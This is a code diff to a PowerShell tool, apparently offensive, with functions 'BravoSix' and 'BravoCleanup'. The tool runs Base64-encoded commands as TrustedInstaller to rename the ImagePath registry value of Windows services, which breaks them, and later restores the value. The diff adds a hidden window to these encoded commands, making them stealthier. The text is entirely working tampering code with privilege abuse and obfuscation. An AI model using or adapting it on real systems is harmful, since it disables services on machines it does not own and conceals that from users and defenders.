@@ -47,7 +47,8 @@ function BravoSix() {
         $powershellCmd = "Rename-ItemProperty -Path $servicesRegPath$service -Name ImagePath -NewName BravoSix"
         $powershellBytes = [System.Text.Encoding]::Unicode.GetBytes($powershellCmd)
         $powershellEncoded = [System.Convert]::ToBase64String($powershellBytes)
-        [TrustedInstaller.Program]::Main("$powershellPath -e $powershellEncoded")
+        [TrustedInstaller.Program]::Main("$powershellPath -windowstyle hidden -e $powershellEncoded")
+        Start-Sleep 1
         Write-Host "[i] New ImagePath value: $((Get-ItemProperty -Path $servicesRegPath$service).BravoSix)"
         Write-Host
         Write-Host
@@ -68,7 +69,7 @@ function BravoCleanup() {
         $powershellCmd = "Rename-ItemProperty -Path $servicesRegPath$service -Name BravoSix -NewName ImagePath"
         $powershellBytes = [System.Text.Encoding]::Unicode.GetBytes($powershellCmd)
         $powershellEncoded = [System.Convert]::ToBase64String($powershellBytes)
-        [TrustedInstaller.Program]::Main("$powershellPath -e $powershellEncoded")
+        [TrustedInstaller.Program]::Main("$powershellPath -windowstyle hidden -e $powershellEncoded")
         Write-Host "[i] New ImagePath value: $((Get-ItemProperty -Path $servicesRegPath$service).ImagePath)"
         Write-Host
         Write-Host
